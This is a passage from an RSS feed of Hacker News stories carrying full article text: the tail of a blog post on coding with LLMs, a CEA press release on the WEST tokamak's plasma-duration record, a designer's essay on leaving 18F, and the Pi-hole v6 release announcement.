a bit. Sometimes a quick break or short walk will help. In this regard it is a normal problem-solving process, but accelerated to a breakneck speed.</p><blockquote><p>We will often ask the LLM to include ridiculous things in our not very ridiculous code. For instance, we asked it to create a lore file and then reference the lore in the user interface. This is for python cli tools. Suddenly there is lore, glitchy interfaces, etc. All to manage your cloud functions, your todo list or whatever. The sky is the limit.</p></blockquote><h2 id="i-am-so-lonely-">I am so lonely (｡•́︿•̀｡)</h2><p>My main complaint about these workflows is that it is largely a solo endeavor - i.e. the interfaces are all <em>single player mode</em>.</p><p>I have spent years coding by myself, years coding as a pair, and years coding in a team. It is always better with people. These workflows are not easy to use as a team. The bots collide, the merges are horrific, the context complicated.</p><p>I really want someone to solve this problem in a way that makes coding with an LLM a multiplayer game. Not a solo hacker experience. There is so much opportunity to fix this and make it amazing.</p><p>GET TO WORK!</p><h2 id="ⴵ-time-ⴵ">ⴵ Time ⴵ</h2><p>All this codegen has accelerated the amount of code that I as a single person am able to generate. However, there is a weird side effect. I find myself having a huge amount of “downtime” while waiting for the LLM to finish burning its tokens.</p><figure role="group" aria-describedby="caption-I remember this like it was yesterday"><img title="" loading="lazy" decoding="async" src="https://harper.blog/images/posts/apple-print-shop-printing.png" alt="Printing" width="" height=""><figcaption id="caption-I remember this like it was yesterday">I remember this like it was yesterday</figcaption></figure><p>I have changed how I work enough to start incorporating some practice that will try and eat the waiting time:</p><ul><li>I start the “brainstorming” process for another project</li><li>I listen to records</li><li>I play <a href="https://orteil.dashnet.org/cookieclicker/">cookie clicker</a></li><li>I talk with friends and robots</li></ul><p>It is awesome to be able to hack like this. Hack Hack Hack. I can’t think of another time I have been this productive in code.</p><h2 id="haterade--_-">Haterade ╭∩╮( •̀_•́ )╭∩╮</h2><p>A lot of my friends are like “fuck LLMs. They are terrible at everything.” I don’t mind this POV. I don’t share it, but I think it is important to be skeptical. There are an awful lot of reasons to hate AI. My main fear is about power consumption and the environmental impact. But… the code must flow. Right… sigh.</p><p>If you are open to learning more, but don’t want to dig in and become a cyborg programmer - my recommendation is not to change your opinion, but to read Ethan Mollick’s book about LLMs and how they can be used: <a href="https://www.penguinrandomhouse.com/books/741805/co-intelligence-by-ethan-mollick/"><strong>Co-Intelligence: Living and Working with AI.</strong></a></p><p>It does a good job of explaining the benefits without being a tech anarcho-capitalist bro type tome. I found it very helpful, and have had so many good and nuanced conversations with friends who have read it. Highly recommended.</p><p>If you are skeptical, but a bit curious - feel free to hit me up and let’s talk through all this madness. I can show you how we use LLMs, and maybe we could build something together.</p><p><em>thanks to <a href="https://derek.broox.com/">Derek</a>, <a href="https://nocruft.com/">Kanno</a>, <a href="https://fsck.com/">Obra</a>, and <a href="https://thinks.lol/">Erik</a> for taking a look at this post and suggesting edits. I appreciate it.</em></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Nuclear fusion: WEST beats the world record for plasma duration (425 pts)]]></title>
            <link>https://www.cea.fr/english/Pages/News/nuclear-fusion-west-beats-the-world-record-for-plasma-duration.aspx</link>
            <guid>43093939</guid>
            <pubDate>Tue, 18 Feb 2025 19:26:33 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.cea.fr/english/Pages/News/nuclear-fusion-west-beats-the-world-record-for-plasma-duration.aspx">https://www.cea.fr/english/Pages/News/nuclear-fusion-west-beats-the-world-record-for-plasma-duration.aspx</a>, See on <a href="https://news.ycombinator.com/item?id=43093939">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="ctl00_PlaceHolderMain_DisplayModePanel_top">
		
                <div>
                    <p id="ctl00_PlaceHolderMain_DisplayModePanel_top_TaxonomyFields_TaxonomyFieldsControl"><span><a href="https://www.cea.fr/english/Pages/SPECIAL-PAGES/Local-search.aspx?k=Press%20release">Press release</a></span> | <a href="https://www.cea.fr/english/Pages/SPECIAL-PAGES/Local-search.aspx?k=Energies">Energies</a> | <a href="https://www.cea.fr/english/Pages/SPECIAL-PAGES/Local-search.aspx?k=Fusion%20through%20magnetic%20containment">Fusion through magnetic containment</a> | <a href="https://www.cea.fr/english/Pages/SPECIAL-PAGES/Local-search.aspx?k=Nuclear%20fusion">Nuclear fusion</a></p>

                    
                    
                    
                    <p><img src="https://www.cea.fr/english/PublishingImages/thumbnails/photo-plasma.jpg" id="ctl00_PlaceHolderMain_DisplayModePanel_top_PeoplePicture_ImagetteField" width="218" height="138">
    <small id="ctl00_PlaceHolderMain_DisplayModePanel_top_PeoplePicture_SmallCredits">© CEA</small>
</p>

                    <div>
                        <p>​On 12 February, the CEA’s WEST machine was able to maintain a plasma for more than 22 minutes. In doing so, it smashed the previous record for plasma duration achieved with a tokamak. This leap forward demonstrates how our knowledge of plasmas and technological control of them over longer periods is becoming more mature, and offers hope that fusion plasmas can be stabilised for greater amounts of time in machines such as ITER.</p>
                    </div>
                </div><!--.cartouche-->

                <div id="bando-infos">
                    <p><em>
                    
                            Published on&nbsp;18 February 2025                      
                    
                    </em></p>


                </div><!--#bando-infos-->

                <div>
                    <div id="ctl00_PlaceHolderMain_DisplayModePanel_top_ctl02__ControlWrapper_RichHtmlField" aria-labelledby="ctl00_PlaceHolderMain_DisplayModePanel_top_ctl02_label"><p>​<strong>1,337 seconds: that was how long WEST, a tokamak run from the CEA Cadarache site in southern France&nbsp;and one of the EUROfusion consortium medium size Tokamak facilities, was able to maintain a plasma for on 12 February. </strong>This was a 25% improvement on the previous record time achieved with EAST, in China, a few weeks previously.</p><p><img src="https://www.cea.fr/english/PublishingImages/Pages/News/nuclear-fusion-west-beats-the-world-record-for-plasma-duration/plasma-record-image.jpg" alt="The plasma record reached a temperature of 50 million degrees." title="The plasma record reached a temperature of 50 million degrees. © CEA" id="img_o7r12ppr">&nbsp;</p><p>The plasma record reached a temperature of 50 million degrees. © CEA</p><p>Reaching durations such as these is <strong>a crucial milestone for machines like Iter</strong>, which will need to maintain fusion plasmas for several minutes. The end goal is to control the plasma, which is naturally unstable, while ensuring that all plasma-facing components are able to withstand its radiation without malfunctioning or polluting it.</p><p><img src="https://www.cea.fr/english/PublishingImages/Pages/News/nuclear-fusion-west-beats-the-world-record-for-plasma-duration/Vue-west-hall-tore.jpg" alt="WEST, the tokamak run by the CEA " title="WEST, the tokamak run by the CEA  © L. Godart/CEA" id="img_94elihk3">&nbsp;</p><p>WEST, the tokamak run by the CEA  © L. Godart/CEA</p><p>This is what CEA researchers intend to achieve and what explains the current record. Over the coming months, the WEST team will double down on its efforts to achieve very long plasma durations – up to several hours combined – but also to heat the plasma to even higher temperatures with a view to approaching the conditions expected in fusion plasmas.</p><p><strong>WEST is a CEA facility that benefits from the commission’s decades of experience in the use of tokamaks to study plasmas</strong>. It welcomes researchers from around the world, who make use of its key characteristics that allow long-duration plasmas, particularly its superconducting coils and actively cooled components. WEST is one facet of an international movement comprising other major experiments in which CEA researchers are heavily involved, such as JET, the Joint European Torus tokamak in the United Kingdom (closed in late 2023), which holds the record for fusion energy, JT-60SA in Japan, EAST in China, and KSTAR in South Korea, not to mention the flagship machine that is ITER.<br></p><blockquote><br>“WEST has achieved a new key technological milestone by maintaining hydrogen plasma for more than twenty minutes through the injection of 2 MW of heating power. Experiments will continue with increased power. This excellent result allows both WEST and the French community to lead the way for the future use of ITER.”, comment Anne-Isabelle Etienvre, Director of Fundamental Research at the CEA.<br></blockquote><h2>What is fusion used for?</h2><p>Nuclear fusion is a technology with the ultimate goal of controlling naturally unstable plasma. It uses even fewer resources and less fuel than fission, which was already very concentrated, and does not produce long-lived radioactive waste.&nbsp;&nbsp; &nbsp;</p><p>Of the various possible techniques for generating energy, the most advanced is magnetic confinement fusion , where plasma is held in a torus by an intense magnetic field and heated until the hydrogen nuclei fuse. Confinement fusion has been shown by JET to produce fusion power of 15 MW for several seconds.</p><p>France, home to both WEST and ITER, is well-placed to house the first prototype nuclear fusion reactor. Nuclear fusion is a source of energy that exploits nuclear reactions, with many possible complementary aspects with nuclear fission energy and associated techniques relating to neutrons and matter, which are well understood.</p><div><p>Nevertheless, given the infrastructure needed to produce this energy on a large scale, it is unlikely that fusion technology will make a significant contribution to achieving net-zero carbon emissions by 2050. For this, several technological sticking points need to be overcome, and the economic feasibility of this form of energy production must still be demonstrated.</p></div></div>
            
                     

                    <p id="ctl00_PlaceHolderMain_DisplayModePanel_top_GoToLink1_GoTopParagraph"><a href="#top" title="Go to the top of the page">Top page</a></p>
   
                            
                    
                    <!--#navmore-->


                    
                    <p id="navtags"><h2>Keywords&nbsp;:&nbsp;<a href="https://www.cea.fr/english/Pages/SPECIAL-PAGES/Local-search.aspx?k=fusion">fusion</a> | <a href="https://www.cea.fr/english/Pages/SPECIAL-PAGES/Local-search.aspx?k=plasma">plasma</a></h2></p><!--#navtags-->
                
                </div>
            
	</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Moving on from 18F (350 pts)]]></title>
            <link>https://ethanmarcotte.com/wrote/leaving-18f/</link>
            <guid>43093859</guid>
            <pubDate>Tue, 18 Feb 2025 19:18:43 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://ethanmarcotte.com/wrote/leaving-18f/">https://ethanmarcotte.com/wrote/leaving-18f/</a>, See on <a href="https://news.ycombinator.com/item?id=43093859">Hacker News</a></p>
<div id="readability-page-1" class="page"><article id="content" tabindex="-1">

      






    

    

    <div>
      <p><strong>Note:</strong> This post gets into the last few weeks of American politics. If that’s not your cup of tea, or if that’s a stressful topic for you, please feel free to skip this one. (Also, it’s a bit long. Sorry about that.)</p>
<hr>
<p>Last week, I finished my tenure as <a href="https://ethanmarcotte.com/wrote/18f/">a designer at 18F</a>.</p>
<p>I want to state up front: I’m not leaving under a “<a href="https://www.afge.org/article/afge-cautions-feds-not-to-be-tricked-into-resigning-you-might-not-get-paid/">deferred resignation</a>”. I also wasn’t laid off. (Though it’s possible I almost was; more on that later.) Instead, I resigned from my position as a product designer, submitting two weeks’ notice…well, two weeks ago.</p>
<p>Before I get into any of that, I’d like to write a bit about 18F, and why it was so hard to leave.</p>
<hr>
<p>While I was writing this post, I thought I’d revisit <a href="https://ethanmarcotte.com/wrote/18f/">what I wrote when I joined 18F last May</a>:</p>
<blockquote>
<ol>
<li>Every single person I’ve met this week — and I’ve met quite a few! — has been smart, kind, <em>and</em> really happy to be working where they do. As someone new to the organization, that’s so encouraging to see.</li>
<li>It’s, like, remarkably energizing to be around people who are really (really, really) passionate about making digital services work better for people.</li>
</ol>
</blockquote>
<p>Honestly, that holds up. Because really, the thread here is the people working at 18F, and the culture they’d built: I really, <em>really</em> liked showing up for work each morning. Everyone I met at 18F was inviting and kind, and excited to talk about what they were working on. (And just as crucially, what they did <em>outside</em> work.)</p>
<p>And my goodness, they were helpful — which, as a new kid joining the team, I’m always going to remember. Here’s one example: during my first month, I was grousing about some weird little computer issue, and a random coworker just offered to hop on a call to look at it with me. They hadn’t dealt with the issue before, and they definitely hadn’t dealt with <em>me</em> before, but they thought they might help a coworker out. And that impulse — <em>maybe I can help someone out</em> — sums up so many of my interactions with everyone at 18F. They were, and are, a remarkable group of people.</p>
<p>At the same time, I was proud of the work I was doing. Alongside my coworkers at 18F, I worked with client teams to help them define requirements, refine their designs, and build better products. I even got asked to pitch in on a small branding project, and I’d be the last person to call myself a brand designer. But I mention that because I was often asked to stretch myself, and every single time I felt safe trying something new — safe, and supported by my team. I can count on one hand the number of times over my career that I’ve felt that kind of safety at work. I doubt that’s true of every job in government, but I know it was true for me at 18F.</p>
<p>I know it sounds pat, but 18F was one of the best places I’ve ever worked. Until it wasn’t, and I felt I had to leave.</p>
<hr>
<p>Before I dive in, here are a couple points that’ll become relevant:</p>
<ul>
<li>I was considered a <em>probationary</em> employee because I’d been employed by the government for less than a year. <a href="https://federalnewsnetwork.com/workforce-rightsgovernance/2025/02/what-are-the-rules-for-probationary-periods-and-federal-employees/">Probationary employees</a> don’t have most of <a href="https://www.mspb.gov/">the protections afforded to “full” employees</a>, and can be dismissed more easily.</li>
<li>Due to some idiosyncrasies of how our roles were defined, many (most?) people in my organization were legally not eligible to join a union.</li>
</ul>
<p>So. After last year’s election, I was trying to decide whether or not I could stay at the job. A far-right candidate had won the election<sup><a href="#fn-margins" id="fnref-fn-margins">1</a></sup>, and was threatening to <a href="https://en.wikipedia.org/wiki/Project_2025">reshape the government</a> into something more partisan, more regressive, and more autocratic. My job involved putting rectangles on screens, and couldn’t have been further from any kind of political influence or impact. But despite that, I didn’t know if I could let myself be part of that government, even in a small way. (Also, <a href="https://ethanmarcotte.com/wrote/catalog/">as you might have guessed</a>: I was panicking.)</p>
<p>During that time, a friend suggested that while things were calm at work, I should write down some lines I wouldn’t want to cross: things I’d want to watch out for that, if they materialized, might be a reason to leave. This was wonderful advice, and I’m grateful to them for it. Equipped with a plan, even a small one, I started thinking through what my lines would be.</p>
<p>I’ll spare you the whole list, but I’ll share three of the entries.</p>
<ol>
<li>First, I need to work remotely. If the incoming administration made good on its promise to end teleworking for federal workers, I’d likely have to find another job. (This is, of course, <a href="https://finance.yahoo.com/news/quarter-bosses-admit-return-office-104103939.html">why “return to office” policies happen</a>.)</li>
<li>The second line was whether I’d be asked to work on a project that could kill or surveil people. I know precisely what governments are capable of — for good and for ill. But one of the things that drew me to the work at 18F was that I understood they tried to weigh individual workers’ preferences when projects were staffed. I figured if that ever changed, and I was asked to work on something I was morally opposed to, it’d be time to leave.</li>
<li>The third was being asked to meet with someone who didn’t work for the government, and being asked to discuss what I did for work.</li>
</ol>
<p>The first two were things I looked into when I was first interviewing at 18F: some of the basic criteria I was screening potential employers for. The third was driven at least in part by the election, and by the billionaire they were putting in charge of “government tech modernization.” I expected that if things went south, he’d just try to run the same horrible <a href="https://web.archive.org/web/20221102222024/https://www.washingtonpost.com/technology/2022/10/29/elon-musk-twitter-takeover/#:~:text=The%20note%20continued%3A%20%E2%80%9CPlease%20come%20prepared%20with%20code%20as%20a%20backup%20to%20review%20on%20your%20own%20machines%20with%20Elon.%E2%80%9D%20Later%2C%20people%20inside%20the%20company%20reported%20that%20Tesla%20engineers%20were%20in%20fact%20reviewing%20the%20code.">Twitter layoffs handbook</a>, and bring in employees from his other companies to rank — and cull — workers.</p>
<p>But it wasn’t just about that. Many things started happening to the federal government after the inauguration, none of them good. While the administration was conducting its vicious rollback of civil liberties and publicly funded research, <a href="https://www.bbc.com/news/articles/c23vkd57471o#:~:text=Despite%20its%20full%20name%2C%20Doge%20is%20not%20an%20official%20government%20department%2C%20which%20would%20have%20had%20to%20be%20established%20by%20an%20act%20of%20Congress.">this billionaire’s so-called “department”</a> was sweeping through <a href="https://www.wired.com/story/elon-musk-lackeys-office-personnel-management-opm-neuralink-x-boring-stalin/">various federal agencies</a>,  pushing aside career civil servants and the law to <a href="https://abcnews.go.com/US/judge-decide-block-doge-accessing-sensitive-labor-department/story?id=118575362">hoover up</a> <a href="https://www.nbcnews.com/politics/doge/doge-affiliated-employee-accessed-irs-system-sensitive-taxpayer-inform-rcna192423">radioactively</a> <a href="https://www.cnn.com/2025/02/17/politics/doge-irs-taxpayer-data/index.html">sensitive data</a> — <em>our</em> data, bought and paid for with <em>our</em> tax dollars, I should add.<sup><a href="#fn-conflicts" id="fnref-fn-conflicts">2</a></sup> And from what I’d read the group was acting on <a href="https://www.washingtonpost.com/business/2025/02/04/elon-musk-government-legal-doge/">dubious legal authority</a>, and with even less <a href="https://oversightdemocrats.house.gov/sites/evo-subsites/democrats-oversight.house.gov/files/evo-media-document/2025-02-06.Dem%20Members%20to%20IGs%20re%20Musk.pdf">oversight</a> or <a href="https://www.404media.co/doge-employees-ordered-to-stop-using-slack-while-agency-transitions-to-a-records-system-not-subject-to-foia/">transparency</a>. I didn’t want to sit down with anyone involved in that, and pretend like any part of their work was lawful, legitimate, or moral.</p>
<p>Anyway. The list was a tremendous help; I’ll always be grateful to the friend who suggested it. But given the speed at which government typically moves, I assumed I’d have several months before I’d have to wrestle with any of these questions. If not longer.</p>
<p>(I know, I know. I’m in the future, too.)</p>
<p>A few weeks ago, a member of <a href="https://www.gsa.gov/about-us/newsroom/news-releases/gsa-announces-new-commissioners-tts-director-and-general-counsel-01242025">the new leadership</a> announced they’d be reaching out to workers to discuss their recent “technical wins”, in order to better understand how the organization worked. The stress on “<em>technical</em> wins” to a <a href="https://experience.dropbox.com/resources/cross-functional-teams">cross-functional organization</a> felt significant to me; it also felt significant that most of the sessions seemed to be getting scheduled with folks who’d only recently joined government — probationary employees.</p>
<p>Just to state the obvious, this isn’t what you do when you want to understand how your organization works; it <em>is</em> what you do when you’re preparing to slash the size of your workforce. As you might imagine, this caused no small amount of panic across the agency, including within 18F. The new leadership hadn’t communicated these plans to anyone before making their announcement, which left 18F’s own leaders and supervisors frantically working to fill in the information void.</p>
<p>Shortly after the announcement, I started hearing about folks who’d had their meetings, but that they didn’t meet with the director who said they’d be conducting the interviews. Instead, they found themselves on a call with people who wouldn’t say where they worked in government; in a few cases, some people wouldn’t disclose their last names, or any part of their names.</p>
<p>And while I was watching these reports trickle in, I got a calendar invitation for my own interview. From the first email announcing the meetings, I figured one of my lines was in danger of being crossed; I just figured I’d have more time.</p>
<p>With only a few hours before my interview, I did a quick overview of my options. It looked like this:</p>
<ol>
<li>I could do the interview.</li>
<li>I could refuse to do the interview.</li>
<li>I could delay: call out sick, take a personal day, whatever.</li>
<li>I could resign.</li>
</ol>
<p>The first item wasn’t really an option, as sitting down with this “department” wasn’t something I could let myself do. Refusing to participate would’ve likely been seen as insubordination by a probationary hire; delaying would’ve just been, well, delaying the inevitable. (It also could have been seen as insubordination.) My math would’ve been different if I wasn’t probationary or, even better, if I’d been allowed to join a union. But given my lack of labor protections, and the options available before me, leaving 18F — withholding my labor — felt like my best and only option. I called a meeting with my supervisor, and gave two weeks’ notice.</p>
<p>In a terrible coda, a large number of <a href="https://www.npr.org/2025/02/13/nx-s1-5296928/layoffs-trump-doge-education-energy">probationary employees were summarily let go</a> at <a href="https://fedscoop.com/gsa-looks-to-terminate-probationary-employees/">my agency</a> just before my last day.</p>
<hr>
<p>Leaving was the right call for me, but I’ll never feel good about the decision. I mean, there’s the grief angle: up until about a month ago, I was working on projects that felt like they mattered, and working alongside people who cared about helping government services work better for the public. A few months ago, I would’ve told you I’d like to stay there for years, which is not something I’ve said about any other place I’ve ever worked. I am incredibly sad to leave this job.</p>
<p>And look, being able to leave is, flatly, a privileged option: I can’t not work forever, but I <em>can</em> not work for a little bit. Most of my coworkers didn’t have that option. Some had just bought a house; some returned from parental leave, only to learn they might be losing the jobs they’d counted on to support their families.</p>
<p>I’m also angry at what was taken from me. At what’s <em>being</em> taken from all of us. I’ve watched a wonderful job, a wonderful place to work, a wonderful <em>team</em> get pulled apart by rich men in ill-fitting suits, each of them parroting the same talking points around “realignment” and “right-sizing”.<sup><a href="#fn-datalake" id="fnref-fn-datalake">3</a></sup></p>
<p>But what’s happening right now is not about “government efficiency,” nor is it about “cost-cutting.” I would gently urge you to look at the net worth of the people who are telling you otherwise. After all, there is no financial analysis; no review of possible downsides, no weighing of potential negative impacts. There is no discussion of <em>what could happen if our math is wrong?</em> Or even more importantly, no consideration of <em>who might be harmed?</em></p>
<p>Instead, as <a href="https://www.anildash.com/">Anil Dash</a> predicted, the billionaire’s so-called “efficiency“ “department” is best understood as a sprawling form of <a href="https://www.anildash.com/2025/01/04/DOGE-procurement-capture/">procurement capture</a>, in which a group of impossibly rich individuals are trampling over the regulations — and the federal workers — that stand between them and a deep, deep <a href="https://newrepublic.com/article/191506/musk-bezos-pichai-zuckerberg-microsoft-trump-climate">revenue</a> <a href="https://www.technologyreview.com/2024/12/04/1107897/openais-new-defense-contract-completes-its-military-pivot/">stream</a>: <a href="https://www.wired.com/story/elon-musk-lieutenant-gsa-ai-agency/">your tax dollars</a>. And as they do, they’re making an explicitly fascist move to roll back rights for every marginalized community in the country — for anyone who doesn’t look like them, or who stands in their way.</p>
<p>So, yes. This is a wholesale attack on the American safety net, led by billionaires and far-right politicians who are frighteningly comfortable with fascism and autocracy. The last month has been called a coup by <a href="https://www.usatoday.com/story/news/politics/2025/02/03/dems-elon-musk-doge-takeover-treasury/78187978007/">politicians</a>, <a href="https://www.techpolicy.press/anatomy-of-an-ai-coup/">researchers</a>, and <a href="https://therevolvingdoorproject.org/tracking-the-doge-treasury-raid/">watchdogs</a> alike. I don’t want to diminish the harm these people will do — the harm they are doing. I also don’t want to downplay the terror of this moment, because lord knows I fucking feel it.</p>
<p>At the same time: what’s happening right now is <em>also</em> a labor story.</p>
<p>If the American government is slow-moving, it’s because rapid change is deadly when you’re talking about healthcare, social security checks, market regulations, food safety, or any of the other countless critical functions it performs. Those federal agencies are, quite simply, infrastructure. And as <a href="http://debcha.org/">Deb Chachra</a> showed in <a href="https://www.penguinrandomhouse.com/books/612711/how-infrastructure-works-by-deb-chachra/">her excellent book</a>, infrastructure is how a society invests in its future: in its ongoing economic, societal, and political stability.</p>
<p>In government, that infrastructure is built by laws, policies, and regulations. But regulations alone do not infrastructure make. Regulations require <em>workers</em> to become infrastructure: those workers who labor to understand new policies, how best to enact them, and then work to make them legible and understandable to the American public — and, yes, to enforce them. Without those federal workers, and their labor, these systems fall apart. And the architects of this assault on the federal workforce are keenly aware of that fact.</p>
<p>The last month has, flatly, been hell. But even so, I wouldn’t trade away my time at 18F for anything. It was a fantastic place to work, filled with genuine, hard-working people who cared for that work <em>and</em> for each other. Even when things got rough, I saw the leaders of 18F scramble to answer their team’s questions; I saw coworkers reaching out to support each other in countless little ways. All while ensuring they got their project work in on time. I saw something wonderful at work, <em>in</em> my work. I’m always going to be grateful for that, and to my coworkers.</p>
<hr>
<h2 id="resources" tabindex="-1">Resources</h2>
<ul>
<li>Wired has some <a href="https://www.wired.com/story/doge-tts-fired/">good coverage on the layoffs I described above</a>, and <a href="https://www.wired.com/tag/elon-musk/">on the billionaire coup more generally</a>.</li>
<li>The <a href="https://www.instagram.com/workingfamilies/p/DGLZz2CP9bH/">Working Families Party</a> and <a href="https://emilyinyourphone.substack.com/p/everything-you-need-to-know-about">Emily Amick</a> both had some great primers on what it means to call your members of Congress, if that’s a thing you’re able to do.</li>
<li>If you’re looking for other ways to get engaged, <a href="https://bsky.app/profile/prisonculture.bsky.social">Mariame Kaba</a> has pulled together a massive list of <a href="https://docs.google.com/document/d/1OSWxykA1WHOi0vTPLAJDaCeVhR3uSfh7PhlCj4t4yT0/edit?tab=t.0">actions that are not protesting or voting</a>.</li>
</ul>
<hr>

    </div><!-- /end .post-content -->

    

    
    <!-- /end .post-footer -->
    


  </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Pi-hole v6 (495 pts)]]></title>
            <link>https://pi-hole.net/blog/2025/02/18/introducing-pi-hole-v6/</link>
            <guid>43093328</guid>
            <pubDate>Tue, 18 Feb 2025 18:31:36 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://pi-hole.net/blog/2025/02/18/introducing-pi-hole-v6/">https://pi-hole.net/blog/2025/02/18/introducing-pi-hole-v6/</a>, See on <a href="https://news.ycombinator.com/item?id=43093328">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
      <p><img width="1024" height="1024" src="https://wp-cdn.pi-hole.net/wp-content/uploads/2024/08/v6-png.avif" alt="" decoding="async" fetchpriority="high" srcset="https://wp-cdn.pi-hole.net/wp-content/uploads/2024/08/v6-png.avif 1024w, https://wp-cdn.pi-hole.net/wp-content/uploads/2024/08/v6-150x150.png 150w, https://wp-cdn.pi-hole.net/wp-content/uploads/2024/08/v6-300x300.png 300w, https://wp-cdn.pi-hole.net/wp-content/uploads/2024/08/v6-768x768.png 768w, https://wp-cdn.pi-hole.net/wp-content/uploads/2024/08/v6-100x100.png 100w" sizes="(max-width: 1024px) 100vw, 1024px" data-has-transparency="false" data-dominant-color="211f1f"></p>
<p>We’re excited to announce the general release of Pi-hole v6!</p>
<h3>At a glance: What’s New in Pi-hole v6?</h3>
<h4>1. <strong>Embedded Web Server and REST API</strong></h4>
<p>We’ve integrated a new REST API and embedded web server directly into the <code>pihole-FTL</code> binary. This eliminates the need for <code>lighttpd</code> and <code>PHP</code>, reducing the installation footprint and boosting performance. The new API also offers server-side pagination for the query log, ensuring a faster and more responsive interface.</p>
<p>As <code>lua</code> has been embedded into the <code>pihole-FTL</code> binary for <a href="https://github.com/pi-hole/FTL/pull/913">some time now</a>, we have been able to leverage this to rewrite the web interface.<strong><code></code></strong></p>
<h4>2. <strong>Advanced Filtering and Allowlists</strong></h4>
<p>Pi-hole v6 introduces support for subscribed allowlists (Otherwise known as “Antigravity”). These lists work in much the same way as blocklists, but they&nbsp;<em>allow&nbsp;</em>domains instead of&nbsp;<em>denying</em> them</p>
<h4>3. <strong>Consolidated Configuration Files</strong></h4>
<p>We’ve streamlined configuration management by consolidating multiple settings files into a single, richly commented <code>toml</code> file, making it easier to manage and understand your settings. If you are migrating from v5, your existing configurations will be migrated automatically into this file. It can be found at <code>/etc/pihole/pihole.toml</code></p>
<p>Configuration can be set in multiple ways:</p>
<ul>
<li>Directly editing the <code>toml</code> file</li>
<li>Via the command line, e.g <code>pihole-FTL --config dns.upstreams 8.8.8.8</code></li>
<li>Using the API</li>
<li>Via the web interface (which uses the API 😉)</li>
<li>Via environment variables named, e.g <code>FTLCONF_dns_upstreams=8.8.8.8</code></li>
</ul>
<p>If setting via environment variables, it should be noted that this effectively makes the setting read-only, as the environment variable will always force the value to match itself. This is the preferred way to configure FTL in the docker container.</p>
<h4>4. <strong>Redesigned User Interface</strong></h4>
<p>The web interface has been completely overhauled with settings split into Basic and Expert modes. This allows users to customize their experience based on their comfort level and needs.</p>
<h4>5. <strong>HTTPS Support</strong></h4>
<p>Pi-hole v6 includes native HTTPS support, with options to provide your own certificates or use auto-generated ones.</p>
<h4>6. <strong>Docker</strong></h4>
<p>Additionally, the Docker image is now based on Alpine, significantly reducing the image size and opening up possibilities for future system support.</p>
<h3>Upgrading and Getting Started</h3>
<h4>Bare Metal</h4>
<p>Upgrading to Pi-hole v6&nbsp; should be straightforward. For existing users, we recommend backing up your current configuration before proceeding, as the upgrade is strictly a one-way operation.</p>
<p>During the upgrade operation, you will be presented with a dialog box asking if you wish to disable <code>lighttpd</code>. Doing so is probably appropriate for most users – unless you are using it to host web pages&nbsp;<em>other than</em> Pi-hole’s, in which case you may choose to keep it enabled. With <code>lighttpd</code> disabled, <code>pihole-FTL</code> will attempt to bind to ports 80 for HTTP and 443 for HTTPS. If there is any conflict on these ports, then it will revert to port 8080 for HTTP.</p>
<h4>Docker</h4>
<p>The docker image has undergone a complete rewrite from the ground up, and is now based on Alpine rather than Debian.&nbsp;The same migration scripts that run on bare metal will also run on Docker – your configurations will be migrated to the new format.</p>
<p>The exception to this is environment variables. You can start the container with the old variables in place but don’t expect them to work! It is recommended to read the docker section of our <a href="https://docs.pi-hole.net/docker/">docs page</a> before upgrading.</p>
<h3>Join the Community</h3>
<p>Pi-hole thrives thanks to our vibrant and supportive community. Whether you’re looking to share your experience, get advice, or stay informed about the latest updates, there’s a place for you. Join the conversation on our <a href="https://discourse.pi-hole.net/" target="_new" rel="noreferrer noopener">official forum</a> or connect with fellow users on our <a href="https://www.reddit.com/r/pihole/" target="_new" rel="noreferrer noopener">subreddit</a>. We look forward to welcoming you!</p>
<h3>Thank You for Your Support</h3>
<p>We want to express our heartfelt thanks to everyone who has supported Pi-hole throughout the years.</p>
<p>Your community contributions and donations are the lifeblood of this project, allowing us to maintain and continually improve Pi-hole while keeping it free for everyone. If you’d like to contribute to our ongoing efforts, please consider donating through our official <a href="https://pi-hole.net/donate" target="_new" rel="noreferrer noopener">donation page</a>. Every contribution, big or small, makes a significant difference in helping us deliver the best project that we can.</p>
<p>Thank you for being part of the Pi-hole community!</p>
    </div></div>]]></description>
        </item>
    </channel>
</rss>